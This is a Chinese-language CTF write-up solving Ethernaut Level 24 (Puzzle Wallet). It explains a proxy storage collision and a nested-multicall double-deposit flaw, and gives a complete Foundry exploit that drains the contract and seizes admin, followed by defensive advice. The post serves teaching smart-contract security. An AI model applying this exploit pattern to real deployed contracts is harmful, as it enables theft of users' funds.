---
title: 'Ethernaut Level 24: Puzzle Wallet - 代理存储冲突与嵌套调用漏洞'
date: 2025-01-25 17:05:00
updated: 2025-01-25 17:05:00
categories:
  - Ethernaut 系列
  - 高级攻击篇 (21-25)
tags:
  - Ethernaut
  - Foundry
  - Proxy
  - Storage Collision
  - delegatecall
  - multicall
  - 智能合约安全
series: Ethernaut Foundry Solutions
excerpt: "深入剖析代理合约（Proxy）中的存储布局冲突问题，并利用 `multicall` 函数中的逻辑漏洞绕过重入保护。通过一系列精心设计的嵌套调用，最终提升为代理合约的 `admin`，掌握 Puzzle Wallet 关卡的破解技巧。"
---

# 🎯 Ethernaut Level 24: Puzzle Wallet - 代理存储冲突与嵌套调用漏洞

> **关卡链接**: [Ethernaut Level 24 - Puzzle Wallet](https://ethernaut.openzeppelin.com/level/24)  
> **攻击类型**: 存储布局冲突 / 逻辑漏洞  
> **难度**: ⭐⭐⭐⭐⭐

## 📋 挑战目标

本关的目标是成为 `PuzzleProxy` 合约的 `admin`。

![Puzzle Wallet Requirements](https://ethernaut.openzeppelin.com/imgs/BigLevel24.svg)

## 🔍 漏洞分析

这是一个涉及代理合约（Proxy）的复杂挑战，包含了多个漏洞的组合利用。我们需要分步解决几个子问题。

### 漏洞 1: 代理存储布局冲突

首先，我们检查 `PuzzleProxy` (代理) 和 `PuzzleWallet` (逻辑) 合约的存储布局。

**`PuzzleProxy` 的存储:**
```solidity
contract PuzzleProxy is Proxy {
    address public pendingAdmin; // slot 0
    address public admin;      // slot 1
    // ...
}
```

**`PuzzleWallet` 的存储:**
```solidity
contract PuzzleWallet is Ownable {
    address public owner;      // slot 0 (继承自 Ownable)
    uint256 public maxBalance; // slot 1
    mapping(address => bool) public whitelisted; // slot 2
    // ...
}
```

由于代理模式使用 `delegatecall`，`PuzzleWallet` 的代码会直接操作 `PuzzleProxy` 的存储。这就导致了存储槽的冲突：

-   `PuzzleProxy` 的 `pendingAdmin` (slot 0) 实际上对应 `PuzzleWallet` 的 `owner` (slot 0)。
-   `PuzzleProxy` 的 `admin` (slot 1) 实际上对应 `PuzzleWallet` 的 `maxBalance` (slot 1)。

我们的最终目标是成为 `PuzzleProxy` 的 `admin`。根据存储冲突，**我们只需要将 `PuzzleWallet` 的 `maxBalance` 设置为我们的地址即可**。

### 漏洞 2: 成为 `owner` 并加入白名单

要调用 `setMaxBalance()`，我们必须是白名单用户。要加入白名单，我们必须是 `PuzzleWallet` 的 `owner`。

-   `PuzzleWallet` 的 `owner` 存储在 slot 0。
-   `PuzzleProxy` 的 `proposeNewAdmin()` 函数可以修改 `pendingAdmin`，也就是修改 slot 0。

因此，第一步是通过调用 `proxy.proposeNewAdmin(player_address)` 来将 `wallet.owner` 设置为我们自己的地址。

成为 `owner` 后，我们就可以调用 `wallet.addToWhitelist(player_address)` 将自己加入白名单。

### 漏洞 3: `multicall` 逻辑漏洞与清空合约余额

现在我们是白名单用户了，但 `setMaxBalance()` 还有一个要求：`require(address(this).balance == 0, "Contract balance is not 0")`。合约在部署时被存入了 0.001 ether，我们需要想办法将合约余额清空。

`execute()` 函数可以提款，但我们只能提出我们存入的金额。问题在于合约中已有的 0.001 ether。

关键在于 `multicall()` 函数：

```solidity
function multicall(bytes[] calldata data) external payable onlyWhitelisted {
    bool depositCalled = false;
    for (uint i = 0; i < data.length; i++) {
        // ...
        if (selector == this.deposit.selector) {
            require(!depositCalled, "Deposit can only be called once");
            depositCalled = true;
        }
        (bool success, ) = address(this).delegatecall(data[i]);
        // ...
    }
}
```

函数通过 `depositCalled` 标志位来防止在一次 `multicall` 中多次调用 `deposit()`。但是，这个保护措施是有缺陷的。`depositCalled` 是一个局部变量，它的作用域仅限于单次 `multicall` 调用。如果我们**在一个 `multicall` 调用中嵌套另一个 `multicall` 调用**，那么内部的 `multicall` 会有自己的、全新的 `depositCalled` 标志位。

这允许我们绕过检查，实现“双重存款”：

1.  我们向 `multicall` 发送 0.001 ether。
2.  `multicall` 的第一个调用是 `deposit()`。这会把我们的 `msg.value` (0.001 ether) 存入，并将我们的余额记录为 0.001 ether。
3.  `multicall` 的第二个调用是**对 `multicall` 自身的嵌套调用**。在这个嵌套调用中，我们再次调用 `deposit()`。
4.  由于 `delegatecall` 的特性，`msg.value` 在嵌套调用中保持不变。因此，第二次 `deposit()` 会再次将同一个 `msg.value` (0.001 ether) 存入，使我们的记录余额变为 0.002 ether。

我们只发送了 0.001 ether，但在合约中的存款记录却是 0.002 ether。现在，我们调用 `execute(player, 0.002 ether, "")`，就可以提走合约中所有的资金（我们存入的0.001 + 合约原有的0.001）。

### 最终攻击流程

1.  **成为 `owner`**: 调用 `proxy.proposeNewAdmin(player)`。
2.  **加入白名单**: 调用 `wallet.addToWhitelist(player)`。
3.  **双重存款**: 构造一个嵌套的 `multicall` 调用，发送 0.001 ether，使自己的存款记录变为 0.002 ether。
4.  **清空合约**: 调用 `wallet.execute(player, 0.002 ether, "")` 提走所有资金。
5.  **成为 `admin`**: 调用 `wallet.setMaxBalance(uint256(uint160(player)))`，将 `maxBalance` (即 `admin`) 设置为我们的地址。

## 💻 Foundry 实现

```solidity
// SPDX-License-Identifier: Unlicense
pragma solidity ^0.8.0;

import "forge-std/Test.sol";
import "src/24_PuzzleWallet.sol";

contract PuzzleWalletTest is Test {
    PuzzleProxy proxy;
    address player;
    PuzzleWallet wallet;

    function setUp() public {
        player = vm.addr(1);

        // 部署逻辑合约和代理合约
        PuzzleWallet puzzleWallet = new PuzzleWallet();
        bytes memory data = abi.encodeWithSelector(PuzzleWallet.init.selector, 1 ether);
        proxy = new PuzzleProxy(address(this), address(puzzleWallet), data);
        wallet = PuzzleWallet(address(proxy));

        // 初始设置，存入 0.001 ether
        vm.deal(address(this), 0.001 ether);
        wallet.addToWhitelist(address(this));
        wallet.deposit{value: 0.001 ether}();
    }

    function testPuzzleWalletAttack() public {
        vm.deal(player, 0.001 ether);
        vm.startPrank(player);

        // 1. 成为 owner
        proxy.proposeNewAdmin(player);

        // 2. 加入白名单
        wallet.addToWhitelist(player);

        // 3. 构造嵌套 multicall 以实现双重存款
        bytes[] memory nestedCalls = new bytes[](1);
        nestedCalls[0] = abi.encodeWithSelector(PuzzleWallet.deposit.selector);

        bytes[] memory calls = new bytes[](2);
        calls[0] = abi.encodeWithSelector(PuzzleWallet.deposit.selector);
        calls[1] = abi.encodeWithSelector(PuzzleWallet.multicall.selector, nestedCalls);
        
        // 发送 0.001 ether，但存款两次
        wallet.multicall{value: 0.001 ether}(calls);

        // 4. 提走所有资金 (0.002 ether)
        wallet.execute(player, 0.002 ether, "");

        // 5. 成为 admin
        wallet.setMaxBalance(uint256(uint160(player)));

        // 验证成功
        assertEq(proxy.admin(), player);

        vm.stopPrank();
    }
}
```

## 🛡️ 防御措施

1.  **对齐存储布局**: 在使用代理模式时，必须确保代理合约和逻辑合约的存储布局是兼容的，以避免存储冲突。在代理合约中为未来的升级保留一些空的存储槽是一种常见的做法。
2.  **修复 `multicall` 漏洞**: `multicall` 中的重入保护应该使用状态变量而不是局部变量。将 `depositCalled` 声明为合约的状态变量，并在 `multicall` 开始时设置，结束时清除，可以防止嵌套调用绕过检查。
3.  **原子化状态变更**: 避免在一次函数调用中混合多种复杂逻辑（如存款和任意 `delegatecall`）。将功能分解为更小、更原子化的函数可以减少意外的交互。

## 🎯 总结

**核心概念**:
-   **代理存储冲突**: `delegatecall` 的核心风险之一。代理和逻辑合约的存储变量必须精确对齐，否则一个合约的变量可能会被另一个合约的函数意外地修改。
-   **嵌套 `delegatecall`**: 对 `delegatecall` 的嵌套调用会继承原始调用的上下文（如 `msg.sender`, `msg.value`），但会创建新的局部变量作用域，这可能被用来绕过基于局部变量的安全检查。

**攻击向量**:
-   利用存储冲突，通过调用一个看似无关的函数（`proposeNewAdmin`）来修改一个关键的状态变量（`owner`）。
-   利用 `multicall` 中基于局部变量的重入保护缺陷，通过嵌套调用实现双重记账，从而窃取合约资金。

**防御策略**:
-   仔细规划和验证代理合约的存储布局。
-   使用状态变量来实现重入保护，而不是局部变量。

## 📚 参考资料

-   [OpenZeppelin: Writing Upgradeable Contracts](https://docs.openzeppelin.com/upgrades-plugins/1.x/writing-upgradeable)
-   [SWC-112: Delegatecall to Untrusted Callee](https://swcregistry.io/docs/SWC-112)